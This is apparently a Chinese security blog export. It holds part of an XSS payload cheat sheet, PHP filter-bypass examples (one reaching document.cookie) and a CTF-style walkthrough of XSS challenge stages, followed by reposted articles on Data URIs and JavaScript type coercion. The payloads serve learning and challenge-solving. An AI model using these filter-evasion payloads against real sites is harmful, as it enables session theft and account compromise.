x;&#125;&lt;/style&gt;&lt;a id=x style="position:absolute;" onanimationcancel="alert(1)"&gt;&lt;/a&gt; // CSS动画结束时触发（Chrome、Firefox、IE、Safari)&lt;style&gt;:target &#123;color: red;&#125;&lt;/style&gt;&lt;a id=x style="transition:color 10s" ontransitioncancel=alert(1)&gt;&lt;/a&gt; // CSS过渡取消时触发（Firefox)&lt;style&gt;:target &#123;color:red;&#125;&lt;/style&gt;&lt;a id=x style="transition:color 1s" ontransitionend=alert(1)&gt;&lt;/a&gt; // CSS过渡结束时触发（Chrome)&lt;style&gt;:target &#123;transform: rotate(180deg);&#125;&lt;/style&gt;&lt;a id=x style="transition:transform 2s" ontransitionrun=alert(1)&gt;&lt;/a&gt; // CSS过渡开始时触发（Firefox) ◈ &lt;svg&gt; 标签123456789101112131415161718&lt;svg/onload=prompt(1);&gt;&lt;svg onclick/onmouseover/onmouseup=alert(1)&gt;&lt;/svg&gt;&lt;svg&gt;&lt;script&gt;alert&amp;#40/1/&amp;#41&lt;/script&gt; &lt;/svg&gt;// Works With All Browsers&lt;svg&gt;&lt;animate onbegin=alert(1) attributeName=x dur=1s&gt; // 网址更改后触发（Chrome）&lt;svg&gt;&lt;animate onbegin=alert(1) attributeName=x dur=1s&gt; // svg动画开始时触发（Chrome、Firefox、Safari）&lt;svg&gt;&lt;a onload=alert(1)&gt;&lt;/a&gt; // 加载元素时触发（Safari)&lt;svg&gt;&lt;animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 /&gt; // svg动画重复时触发（Chrome、Firefox、Safari)&lt;svg&gt;&lt;a xlink:href="javascript:alert(1)"&gt;&lt;text x="20" y="20"&gt;XSS&lt;/text&gt;&lt;/a&gt; // 带有JavaScript协议的SVG中的Xlink命名空间&lt;svg&gt;&lt;animate xlink:href=#xss attributeName=href values=javascript:alert(1) /&gt;&lt;a id=xss&gt;&lt;text x=20 y=20&gt;XSS&lt;/text&gt;&lt;/a&gt; // 使用值的SVG动画标签&lt;svg&gt;&lt;animate xlink:href=#xss attributeName=href from=javascript:alert(1) to=1 /&gt;&lt;a id=xss&gt;&lt;text x=20 y=20&gt;XSS&lt;/text&gt;&lt;/a&gt; // SVG动画标签用于 &lt;svg&gt;&lt;set xlink:href=#xss attributeName=href from=? to=javascript:alert(1) /&gt;&lt;a id=xss&gt;&lt;text x=20 y=20&gt;XSS&lt;/text&gt;&lt;/a&gt; // SVG设置标签&lt;svg&gt;&lt;script href="data:text/javascript,alert(1)" /&gt; // SVG脚本href属性，（IE、Firefox）无需关闭脚本标签,（Google）需要关闭+++++++++++++++++带有HTML编码的SVG脚本+++++++++++++++++&lt;svg&gt;&lt;script&gt;&amp;#97;lert(1)&lt;/script&gt;&lt;/svg&gt;&lt;svg&gt;&lt;script&gt;&amp;#x61;lert(1)&lt;/script&gt;&lt;/svg&gt;&lt;svg&gt;&lt;script&gt;alert&amp;NewLine;(1)&lt;/script&gt;&lt;/svg&gt;&lt;svg&gt;&lt;script&gt;x="&amp;quot;,alert(1)//";&lt;/script&gt;&lt;/svg&gt; ◈ &lt;var&gt; 标签1&lt;var onmouseover="prompt(1)"&gt;M&lt;/var&gt; ◈ &lt;video&gt; 标签1234&lt;video src=x onerror=prompt(1);&gt;&lt;video&gt;&lt;source onerror="javascript:alert(1)"&gt;&lt;video oncanplaythrough=alert(1)&gt;&lt;source src="validvideo.mp4" type="video/mp4"&gt;&lt;/video&gt; // 加载足够的数据以完全播放资源时触发（Chrome、Firefox、IE、Safari)&lt;video controls onended=alert(1)&gt;&lt;source src="mov_bbb.mp4" type="video/mp4"&gt;&lt;/video&gt; // 视频播放完后触发 三、xss 案例案例一：用 location 变形 payload123456&lt;?phpheader('X-XSS-Protection: 0');$xss = isset($_GET['xss'])?$_GET['xss']:'';$xss = str_replace(array("(",")","&amp;","\\","&lt;","&gt;","'","`","&amp;"), '', $xss);echo "&lt;img src=\"&#123;$xss&#125;\"&gt;";?&gt; 该案例的过滤器过滤了array(“(“,”)”,”&amp;”,”\”,”&lt;”,”&gt;”,”‘“,”`“,”&amp;”)，而没有过滤双引号，输出点在 &lt;img src=&quot;xxxx&quot;&gt;，xxxx这里，怎么构造一个可以利用的XSS Payload？ 涉及的知识点 涉及到js中关键词(函数名、变量名、保留字等)、字符串、左值与右值的问题，也是所有语言中都有的问题。 举例 比如test=&quot;phithon&quot;;，这里test就是左值、变量名，”phithon”就是右值、字符串，=和&quot;是符号。字符串中可以用编码来替换原始字符，比如用\u0028代替左括号(，或用\50来代替左括号(。左值必须是可写的，比如一个变量，我们不能把字符串放在等号左边，因为字符串是一个只读的值。还有，有关于javascript的字符编码，都只能用在字符串中，不能用字符编码去代替符号或变量名、函数名。 分析 可以利用location加javascript伪协议，将“符号”、“变量名”、“函数名”统统变成“字符串”，在字符串中我们可以使用所有js里可以使用的编码，去构造payload。怎么变？比如我们可以构造如下payload： 1&lt;img src="1" onerror=location="javascript:alert(1)"&gt; 这个时候，alert(1)被放进了字符串里，因为有javascript伪协议，所以也可以执行xss。在字符串中就能够用很多编码了，虽然我们这里过滤了(，但可以用url编码来替代括号，如下payload： 1&lt;img src="1" onerror=location="javascript:alert%281%29"&gt; 就能成功绕过上述filter。我们把难度提高一点。再拦截一些关键词，比如document，cookie，eval，setTimeout，alert等： 123456789&lt;?phpheader('X-XSS-Protection: 0');$xss = isset($_GET['xss'])?$_GET['xss']:'';$xss = str_replace(array("(",")","&amp;","\\","&lt;","&gt;","'"), '', $xss);if (preg_match('/(script|document|cookie|eval|setTimeout|alert)/', $xss)) &#123; exit('bad');&#125;echo "&lt;img src=\"&#123;$xss&#125;\"&gt;";?&gt; 这时我们怎么能弹出cookie？这个时候我们可以用字符串拼接的方式绕过，这也是得益于我们之前将要执行的“函数”变成了“字符串”才有的效果，我们不可能直接``，js中只有“字符串”才能拼接。payload例如： 1&lt;img src="1" onerror=location="javascr"+"ipt:al"+"ert%28docu"+"ment.co"+"okie%29"&gt; 参考链接：1.XSS测试备忘录 更新日志1232020.3.9 原发2020.3.12 增加一些各标签中的payload，来源：https://mp.weixin.qq.com/s/pewStdGNzvv5OTl8Vh7okQ2020.3.14 增加&amp;NewLine;&amp;Tab;&amp;colon;增加一些标签的payload]]></content>
      <tags>
        <tag>web</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Th1s_i3_XSS_challenges&from:stage#5&to:stage#12]]></title>
    <url>%2F2020%2F03%2F08%2F2020.03.08%EF%BC%8899%EF%BC%89%2F</url>
    <content type="text"><![CDATA[0x05 Length limited textHint length limited text box 题目分析 ① 首先在输入框中随便输入值 alert(/xss/)，点击search，打开源代码如下： 1&lt;input type="text" name="p1" maxlength="15" size="30" value="alert(/xss/)"&gt; 不难发现我们输的的字符串被赋值给了 value ，那么下一步进行闭合绕过：&quot; onclick=alert(document.domain)，但是在构造的时候却发现，输入框被允许输入最大的字符串长度为15，所以我们的payload无效； ② 虽然输入框要求只能输入 15 个字符串，但是我们可以利用 burpsuit 进行抓包改包，达到我们想要的效果： 点击Forward，发送我们修改过的包，然后再点击输入框，弹窗成功： 相关知识点 burpsuit 的使用 payload1234payload1:" onclick/onmouseup/onmousedown = alert(document.domain)payload2:"&gt;&lt;img/src=# onerror=alert(document.domain)/&gt;payload3:"&gt;&lt;a href="javascript:alert(document.domain)"&gt;/xss/&lt;/a&gt;payload4:"&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt; 注：以上payload需在 burpsuit 中进行； 题目类型 简单的标签闭合问题，并且利用 burpsuit 进行重放的题目 0x06 &lt;input&gt; 标签内部 JS 事件Hint 题目分析 ① 在输入框中试探性的输入 &quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;，得到如下结果： 1&lt;input type="text" name="p1" size="50" value="" &amp;gt;&amp;lt;script&amp;gt;alert(="" xss="" )&amp;lt;="" script&amp;gt;"=""&gt; 从上面的结果中可以看出，将我们输入的 &lt; 和&gt; 进行了一次实体编码，那么我们不能再利用 &lt; 和 &gt; 进行闭合绕过了，我们可以用上个题目中的 payload1 进行尝试，果然成功弹窗。 相关知识点 利用 on+event 进行弹窗 payload1payload:" onclick/onmouseup/onmousedown/on+evet = alert(document.domain) 题目类型 不用闭合标签，在标签内部添加事件，通过触发事件来执行 payload。 0x07 &lt;input &gt;标签内部 js 事件Hint nearly the same... but a bit more tricky. 题目分析 ① 和上面的题目一样，首先来浏览器如何解析我们的输入：&quot; onclick=alert(document.domain)，得到如下结果： 1&lt;input type="text" name="p1" size="50" value="" onclick="alert(document.domain)"&gt; ② 看到源码后，我觉得构造的payload被成功执行了，于是点击输入框，果真弹窗成功。 相关知识点 和上一道题目没有太大的区别 payload1" onclick=alert(document.domain) 题目类型 和上一道题目没有太大的区别 0x08 javascript:伪协议Hint the 'javascript' scheme. 题目分析 ① 和前面的题目一样，首先输入一些字符串，来看看浏览器怎么执行的，在这里我输入的是/xss/，结果如下图： ② 在清楚浏览器是将我们的输入变为一个链接，文本和链接的内容都是我们输入的内容，这道题就不能再利用闭合绕过的原理了，这道题目需要一个新的知识点：伪协议 相关知识点 伪协议 javascript: 的使用 javascript 的入口 payload1javascript:alert(document.domain) 执行成功，如下图所示： 题目类型 &lt;a&gt; 标签中 href 的构造 0x09 UTF-7Hint UTF-7 XSS 题目分析 之所以把提示给显示出来，是因为这是一道 utf-7 问题的题目，需要在 IE7 浏览器才能执行，而且现在用的都是 utf-8，utf-7 早已经被淘汰了，所以这道题目忽略，如果想要这道题目，直接在 f12 中的 console 下输入 alert(document.domain)，就能前往下一题； 相关知识点 utf-7 payload 在 f12 中的 console 下输入 alert(document.domain) 题目类型 utf-7 问题 0x0A 字符/编码绕过Hint s/domain//g; 题目分析 ① 在输入框中输入 &quot; onclick=alert(document.domain) ，并查看源码，得到如下结果： 1&lt;input type="text" name="p1" size="50" value="" onclick="alert(document.)""&gt; 可以看到浏览器将我们输入的 domain 给过滤掉了，而且在)后面多了一个&quot;，所以在构造的时候还要将它闭合/注释掉； ② 我们可以通过根据浏览器原理来进行构造: &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▪ 根据 HTML实体编码 的原理可以这样构造：&quot; onclick=alert(document.&amp;#x64;&amp;#x6F;&amp;#x6D;&amp;#x61;&amp;#x69;&amp;#x6E;) &quot; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▪ 根据 &lt;svg&gt; 和 javascript 编码的原理 还可以这样构造：&quot;&gt;&lt;svg&gt;&lt;script&gt;alert(document.&amp;#x64;&amp;#x6F;&amp;#x6D;&amp;#x61;&amp;#x69;&amp;#x6E;)&lt;/script&gt;&lt;/svg&gt; 和 &quot;&gt;&lt;script&gt;alert(document.\u0064\u006f\u006d\u0061\u0069\u006e)&lt;/script&gt; 相关知识点s HTML 编码、JavaScript 编码 payload1234567payload1:" onclick=alert(document.&amp;#x64;&amp;#x6F;&amp;#x6D;&amp;#x61;&amp;#x69;&amp;#x6E;) "pauload2:"&gt;&lt;a href="javascript:alert(document.&amp;#x64;&amp;#x6F;&amp;#x6D;&amp;#x61;&amp;#x69;&amp;#x6E;)"&gt;/xss/&lt;/a&gt;payload3:"&gt;&lt;svg&gt;&lt;script&gt;alert(document.&amp;#x64;&amp;#x6F;&amp;#x6D;&amp;#x61;&amp;#x69;&amp;#x6E;)&lt;/script&gt;&lt;/svg&gt;payload4:"&gt;&lt;script&gt;alert(document.\u0064\u006f\u006d\u0061\u0069\u006e)&lt;/script&gt;payload5:"&gt;&lt;script/src=http://locahost/payload.js&gt;"&lt;/script&gt; // payload.js 文件里面的内容为：alert(document.\u0064\u006f\u006d\u0061\u0069\u006e)payload6:"&gt;&lt;img/src=# onerror=alert(document.&amp;#x64;&amp;#x6F;&amp;#x6D;&amp;#x61;&amp;#x69;&amp;#x6E;)&gt;payload7:" onclick=alert(document.domdomainain); 题目类型 编码绕过以及字符绕过 0x0B 伪协议Hint "s/script/xscript/ig;" and "s/on[a-z]+=/onxxx=/ig;" and "s/style=/stxxx=/ig;" 题目分析 ① 初尝试：将 onclick = alert(document.domain)&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt; 输入框中，打开源码得到如下的结果： 12&lt;input type="text" name="p1" size="50" value="onxxx= alert(document.domain)"&gt;&lt;xscript&gt;alert(document.domain)&lt;/xscript&gt; 从上面的结果可以看出，浏览器将我们输的 script 变为了 xscript，将 on+event= 变成了 onxxx=，所以构造失败。 ② 绕过：既然有过滤的作用，那么我们是不是可以通过编码绕过呢？script 作为标签的话无法进行编码绕过，否则就会被解码为普通字符串（HTML 解码）或者不能解码（unicode 编码），那么就要想出来一个既能被解码为 script 又能执行 alert(document.domain) 函数的 javascript 的入口，想来想去有一个可以这样做的 javascript: 伪协议，如果用 HTML 实体编码 进行编码的话，浏览器会正常解码，并且 url 编码 也能正常找到地址入口，所以可以的。 ③ 构造 payload：这道题目的 payload 其实和上一道题目的 payload2 相似，只不过是编码的位置不同； 相关知识点 伪协议的相关知识 payload1payload:"&gt;&lt;a href="&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(document.domain)"&gt;/xss/&lt;/&gt; 题目类型 实体编码绕过 0x0C 反引号的特性Hint "s/[\\x00-\\x20\\\\"\\']//g;" 题目分析 ① 同样先输入一些字符串进行试探以下 &quot; onclick=alert(1)&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;/xss/&lt;/a&gt;&lt;script&gt;alert(1)&lt;/script&gt; 得到的源码如下： 12&lt;input type="text" name="p1" size="50"value="onclick=alert(1)ahref=javascript:alert(1)/xss//ascriptalert(1)/script"&gt; 可以看出来，浏览器将我们输入字符串中的 &quot; 、&#39;、&lt; 和 &gt; 进行过滤掉了，所以我们要换一个思路逃逸 &quot; 的束缚； 相关知识点 反引号的特性： 如果 ( 和 ) 被过滤掉，那么就可以用 `` 来代替，同样能够被成功执行； 如果 &quot; 和 &#39; 被过滤掉，那么在 IE 浏览器下也可以用反引号 ` 来代替； payload1payload:`` onclick=alert(document.domain) &lt;!-- 须在 IE 浏览器下执行 --&gt; 题目类型 逃离 &quot; 的束缚 0x0D css1Hint style attribute 题目分析 ① 这是一道利用 css 进行 xss 的题目，需要用到 css expression ，这道题暂时不做 相关知识点 css 的 payload（需要整理） payload题目类型0x0E css2Hint s/(url|script|eval|expression)/xxx/ig; 题目分析 这也是一道 css 的题目，后面再做 相关知识点payload题目类型0x0F DOM xssHint document.write(); 题目分析 ① 先输入&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt; ，看一下 value 值处有没有 xss 可以利用的漏洞，发现很难逃离双引号的束缚，于是看一下有没有别的地方有可以利用的地方，发现可以利用 document.write 的输出进行构造，但是这个函数因为是在js范畴，document.write 在输出的时候会 JavascriptDecode一下数据，会把数据原有 \ 去除。 相关知识点 document.write 的相关知识点： document.write知多少：https://segmentfault.com/a/1190000006197157 payload1payload:\\x3csvg\\x2fonload=alert(document.domain)\\x3e 题目类型 DOM xss 0x10 document.write()Hint "document.write();" and "s/\\\x/\\\\\x/ig;" 题目分析 和上一道题目一样，但是不同的是将 \x 变为了\\x 所以上一道题目的 payload 就无法被执行了，但是我们知道 javascript 编码的格式 相关知识点 document.write 的相关知识点 javascript 可以解析的编码形式： 进制 格式 举例 ascii(默认) 无 >(62) 八进制 \\0（三位，不足补 0 ） \\074 十六进制 \\x00 \\x3 unicode 编码 \\u00 \\u003c payload1payload:\\u003csvg\\u002fonload=alert(document.domain)\\u003e 题目类型0x11- 0x12 skipped]]></content>
      <tags>
        <tag>web</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【转载】Data URI 知识点详解]]></title>
    <url>%2F2020%2F03%2F04%2F2020.03.04%EF%BC%8898%EF%BC%89%2F</url>
    <content type="text"><![CDATA[Data URIData URI是由RFC 2397定义的一种把小文件直接嵌入文档的方案。格式如下： 1data:[&lt;MIME type&gt;][;charset=&lt;charset&gt;][;base64],&lt;encoded data&gt; 其实整体可以视为三部分，即声明：参数+数据，逗号左边的是各种参数，右边的是数据。 声明：data:是URI的协议头，表明其资源是一个data URI； 参数：MIME type，表示数据呈现的格式，即指定嵌入数据的MIME。对于PNG的图片，其格式是：image/png，如果没有指定，默认是：text/plain；character set(字符集）大多数被忽略，默认是：charset=US-ASCII。如果指定是的数据格式是图片时，字符集将不再使用；base64，这一部分将表明其数据的编码方式，此处为声明后面的数据的编码是base64，我们可以不必使用base64编码格式，如果那样，我们将使用标准的URL编码方式（形如%XX%XX%XX的格式）； 数据：这个encoded data部分为实际的数据，可能包含空格，但是无关紧要。 优点和缺点 这两点相信大家都看眼烦了，那就把我认为重要的say下喽。 优点： 1234减少HTTP请求数避免了图片重新上传，清理缓存的问题运用在模版环境中时，省去了拷贝图片的步骤…… 缺点：1.无法重复利用。img虽然是一个请求数，但是加载完后，如果还有N次引用，那还1，而DataURI却必须是N次了；2.图片等资源转换为DataURI所用的Base64编码之后，文件大小增加了好多（通常50%-300%），想想下，如果服务器端不做Gzip压缩的话，那不是要……，压缩后倒是跟原本的差不多大小；3.加载、解码后渲染，消耗内存和CPU，手机上还得耗电池呢啊；4.浏览器限制；5.这个也是最可气的，那么一大长串编码无疑是对自己优雅代码的一个摧残啊，有代码洁癖的你能忍么？6.…… 如何获得图片的base64编码 在网上搜了几个在线的图片转义为base64的，缺发现没几个好用的，而且记不住网址，下面推荐一个，http://www.pjhome.net/web/htm…（原版的），最初见到的是在飘飘那里：http://labs.pufen.net/my_coll…。 当然，这么好的东西自己也必须要收藏一份儿了啊，格桑的博客的地址http://aiyouu.net/tools/datau…，用的时候方便啊，有空了再改造下。 哦，忘了说怎么用了，直接把图片拖到页面里面就可以了。 手机端DataURI比外链资源慢6倍 好久之前（那时候我还在上学）鬼哥写过DataURI会多消耗53%左右的CPU资源，内存多出4倍左右，耗时平均高出24.6倍，那手机上呢？ mobify最新的测试数据：DataURI要比简单的外链资源要慢6倍。 详情点击访问：mobify 使用建议 1234sprite能用还得用啊，DataURI的方法要慎用，对于Webapp，还是研究各种缓存技术；个别不能sprite且质量小的图片可以用DataURI对个别BT需求时可以用来做为替代img的方案……（期待你来补充的哦） 最后：URI，不是URL 如果不仔细看，真的会误把data URI看成data URL，然后用URL的方式去理解URI，其实不然！ URL是uniform resource locator的缩写，在web中的每一个可访问资源都有一个URL地址，例如图片，HTML文件，js文件以及style sheet文件，我们可以通过这个地址去download这个资源。 其实URL是URI的子集，URI是uniform resource identifier的缩写。URI是用于获取资源，包括其附加的信息的一种协议。附加信息可能是地址，也可能不是地址，如果是地址，那么这时URI就变成URL了。注意的是data URI不是URL，因为它并不包含资源的公共地址。 文章转载于http://aiyouu.net/data-uris-e… 参考扩展阅读：1.关于base64编码的原理及实现（表示迷糊）2.Data URIs3.Data URI&amp;MHTML: 用还是不用？4.Data URI的利弊5.手机端DataURI比外链资源慢6倍6.译文：data URI，不是URL啊7.原文：Data URIs explained]]></content>
      <tags>
        <tag>基础知识</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【转载】JavaScript 的隐式转换]]></title>
    <url>%2F2020%2F03%2F04%2F2020.03.04%EF%BC%8897%EF%BC%89%2F</url>
    <content type="text"><![CDATA[作者：keenjaan链接：https://juejin.im/post/5a7172d9f265da3e3245cbca来源：掘金 你有没有在面试中遇到特别奇葩的js隐形转换的面试题，第一反应是怎么会是这样呢？难以自信，js到底是怎么去计算得到结果，你是否有深入去了解其原理呢？下面将深入讲解其实现原理。 其实这篇文章初稿三个月前就写好了，在我读一些源码库时，遇到了这些基础知识，想归档整理下，就有了这篇文章。由于一直忙没时间整理，最近看到了这个比较热的题，决定把这篇文章整理下。 12345678910const a = &#123; i: 1, toString: function () &#123; return a.i++; &#125;&#125;if (a == 1 &amp;&amp; a == 2 &amp;&amp; a == 3) &#123; console.log('hello world!');&#125;复制代码 网上给出了很多不错的解析过程，读了下面内容，你将更深入的了解其执行过程。 1、js数据类型js中有7种数据类型，可以分为两类：原始类型、对象类型： 基础类型(原始值)： 1Undefined、 Null、 String、 Number、 Boolean、 Symbol (es6新出的，本文不讨论这种类型) 复杂类型(对象值)： 1object 2、三种隐式转换类型js中一个难点就是js隐形转换，因为js在一些操作符下其类型会做一些变化，所以js灵活，同时造成易出错，并且难以理解。 涉及隐式转换最多的两个运算符 + 和 ==。 +运算符即可数字相加，也可以字符串相加。所以转换时很麻烦。== 不同于===，故也存在隐式转换。- * / 这些运算符只会针对number类型，故转换的结果只能是转换成number类型。 既然要隐式转换，那到底怎么转换呢，应该有一套转换规则，才能追踪最终转换成什么了。 隐式转换中主要涉及到三种转换： 1、将值转为原始值，ToPrimitive() 2、将值转为数字，ToNumber() 3、将值转为字符串，ToString()。 2.1、通过ToPrimitive将值转换为原始值js引擎内部的抽象操作ToPrimitive有着这样的签名： ToPrimitive(input, PreferredType?) input是要转换的值，PreferredType是可选参数，可以是Number或String类型。他只是一个转换标志，转化后的结果并不一定是这个参数所值的类型，但是转换结果一定是一个原始值（或者报错）。 2.1.1、如果PreferredType被标记为Number，则会进行下面的操作流程来转换输入的值。 1、如果输入的值已经是一个原始值，则直接返回它2、否则，如果输入的值是一个对象，则调用该对象的valueOf()方法，如果valueOf()方法的返回值是一个原始值，则返回这个原始值。 3、否则，调用这个对象的toString()方法，如果toString()方法返回的是一个原始值，则返回这个原始值。4、否则，抛出TypeError异常。 2.1.2、如果PreferredType被标记为String，则会进行下面的操作流程来转换输入的值。 1、如果输入的值已经是一个原始值，则直接返回它2、否则，调用这个对象的toString()方法，如果toString()方法返回的是一个原始值，则返回这个原始值。3、否则，如果输入的值是一个对象，则调用该对象的valueOf()方法， 如果valueOf()方法的返回值是一个原始值，则返回这个原始值。 4、否则，抛出TypeError异常。 既然PreferredType是可选参数，那么如果没有这个参数时，怎么转换呢？PreferredType的值会按照这样的规则来自动设置： 1、该对象为Date类型，则PreferredType被设置为String2、否则，PreferredType被设置为Number 2.1.3、valueOf方法和toString方法解析上面主要提及到了valueOf方法和toString方法，那这两个方法在对象里是否一定存在呢？答案是肯定的。在控制台输出Object.prototype，你会发现其中就有valueOf和toString方法，而Object.prototype是所有对象原型链顶层原型，所有对象都会继承该原型的方法，故任何对象都会有valueOf和toString方法。 先看看对象的valueOf函数，其转换结果是什么？对于js的常见内置对象：Date, Array, Math, Number, Boolean, String, Array, RegExp, Function。 1、Number、Boolean、String这三种构造函数生成的基础值的对象形式，通过valueOf转换后会变成相应的原始值。如： 12345678var num = new Number('123');num.valueOf(); // 123var str = new String('12df');str.valueOf(); // '12df'var bool = new Boolean('fd');bool.valueOf(); // true 2、Date这种特殊的对象，其原型Date.prototype上内置的valueOf函数将日期转换为日期的毫秒的形式的数值。 12var a = new Date();a.valueOf(); // 1515143895500 3、除此之外返回的都为this，即对象本身：(有问题欢迎告知) 12345var a = new Array();a.valueOf() === a; // truevar b = new Object(&#123;&#125;);b.valueOf() === b; // true 再来看看toString函数，其转换结果是什么？对于js的常见内置对象：Date, Array, Math, Number, Boolean, String, Array, RegExp, Function。 1、Number、Boolean、String、Array、Date、RegExp、Function这几种构造函数生成的对象，通过toString转换后会变成相应的字符串的形式，因为这些构造函数上封装了自己的toString方法。如： 12345678910111213141516171819202122232425Number.prototype.hasOwnProperty('toString'); // trueBoolean.prototype.hasOwnProperty('toString'); // trueString.prototype.hasOwnProperty('toString'); // trueArray.prototype.hasOwnProperty('toString'); // trueDate.prototype.hasOwnProperty('toString'); // trueRegExp.prototype.hasOwnProperty('toString'); // trueFunction.prototype.hasOwnProperty('toString'); // truevar num = new Number('123sd');num.toString(); // 'NaN'var str = new String('12df');str.toString(); // '12df'var bool = new Boolean('fd');bool.toString(); // 'true'var arr = new Array(1,2);arr.toString(); // '1,2'var d = new Date();d.toString(); // "Wed Oct 11 2017 08:00:00 GMT+0800 (中国标准时间)"var func = function () &#123;&#125;func.toString(); // "function () &#123;&#125;" 除这些对象及其实例化对象之外，其他对象返回的都是该对象的类型，(有问题欢迎告知)，都是继承的Object.prototype.toString方法。 1234var obj = new Object(&#123;&#125;);obj.toString(); // "[object Object]"Math.toString(); // "[object Math]" 从上面valueOf和toString两个函数对对象的转换可以看出为什么对于ToPrimitive(input, PreferredType?)，PreferredType没有设定的时候，除了Date类型，PreferredType被设置为String，其它的会设置成Number。 因为valueOf函数会将Number、String、Boolean基础类型的对象类型值转换成 基础类型，Date类型转换为毫秒数，其它的返回对象本身，而toString方法会将所有对象转换为字符串。显然对于大部分对象转换，valueOf转换更合理些，因为并没有规定转换类型，应该尽可能保持原有值，而不应该想toString方法一样，一股脑将其转换为字符串。 所以对于没有指定PreferredType类型时，先进行valueOf方法转换更好，故将PreferredType设置为Number类型。 而对于Date类型，其进行valueOf转换为毫秒数的number类型。在进行隐式转换时，没有指定将其转换为number类型时，将其转换为那么大的number类型的值显然没有多大意义。（不管是在+运算符还是==运算符）还不如转换为字符串格式的日期，所以默认Date类型会优先进行toString转换。故有以上的规则： PreferredType没有设置时，Date类型的对象，PreferredType默认设置为String，其他类型对象PreferredType默认设置为Number。 2.2、通过ToNumber将值转换为数字根据参数类型进行下面转换： 参数 结果 undefined NaN null +0 布尔值 true转换1，false转换为+0 数字 无须转换 字符串 有字符串解析为数字，例如：‘324’转换为324，‘qwer’转换为NaN 对象(obj) 先进行 ToPrimitive(obj, Number)转换得到原始值，在进行ToNumber转换为数字 2.3、通过ToString将值转换为字符串根据参数类型进行下面转换： 参数 结果 undefined ‘undefined’ null ‘null’ 布尔值 转换为’true’ 或 ‘false’ 数字 数字转换字符串，比如：1.765转为’1.765’ 字符串 无须转换 对象(obj) 先进行 ToPrimitive(obj, String)转换得到原始值，在进行ToString转换为字符串 讲了这么多，是不是还不是很清晰，先来看看一个例子： 1(&#123;&#125; + &#123;&#125;) = ? 两个对象的值进行+运算符，肯定要先进行隐式转换为原始类型才能进行计算。1、进行ToPrimitive转换，由于没有指定PreferredType类型，{}会使默认值为Number，进行ToPrimitive(input, Number)运算。2、所以会执行valueOf方法，({}).valueOf(),返回的还是{}对象，不是原始值。3、继续执行toString方法，({}).toString(),返回”[object Object]”，是原始值。故得到最终的结果，”[object Object]” + “[object Object]” = “[object Object][object Object]” 再来一个指定类型的例子： 12 * &#123;&#125; = ? 1、首先*运算符只能对number类型进行运算，故第一步就是对{}进行ToNumber类型转换。2、由于{}是对象类型，故先进行原始类型转换，ToPrimitive(input, Number)运算。3、所以会执行valueOf方法，({}).valueOf(),返回的还是{}对象，不是原始值。4、继续执行toString方法，({}).toString(),返回”[object Object]”，是原始值。5、转换为原始值后再进行ToNumber运算，”[object Object]”就转换为NaN。故最终的结果为 2 * NaN = NaN 3、== 运算符隐式转换== 运算符的规则规律性不是那么强，按照下面流程来执行,es5文档 比较运算 x==y, 其中 x 和 y 是值，返回 true 或者 false。这样的比较按如下方式进行： 1、若 Type(x) 与 Type(y) 相同， 则 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1* 若 Type(x) 为 Undefined， 返回 true。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2* 若 Type(x) 为 Null， 返回 true。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3* 若 Type(x) 为 Number， 则 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;(1)、若 x 为 NaN， 返回 false。 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; (2)、若 y 为 NaN， 返回 false。 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; (3)、若 x 与 y 为相等数值， 返回 true。 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; (4)、若 x 为 +0 且 y 为 −0， 返回 true。 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; (5)、若 x 为 −0 且 y 为 +0， 返回 true。 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; (6)、返回 false。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4* 若 Type(x) 为 String, 则当 x 和 y 为完全相同的字符序列（长度相等且相同字符在相同位置）时返回 true。 否则， 返回 false。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5* 若 Type(x) 为 Boolean, 当 x 和 y 为同为 true 或者同为 false 时返回 true。 否则， 返回 false。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;6* 当 x 和 y 为引用同一对象时返回 true。否则，返回 false。 2、若 x 为 null 且 y 为 undefined， 返回 true。3、若 x 为 undefined 且 y 为 null， 返回 true。4、若 Type(x) 为 Number 且 Type(y) 为 String，返回比较 x == ToNumber(y) 的结果。5、若 Type(x) 为 String 且 Type(y) 为 Number，返回比较 ToNumber(x) == y 的结果。6、若 Type(x) 为 Boolean， 返回比较 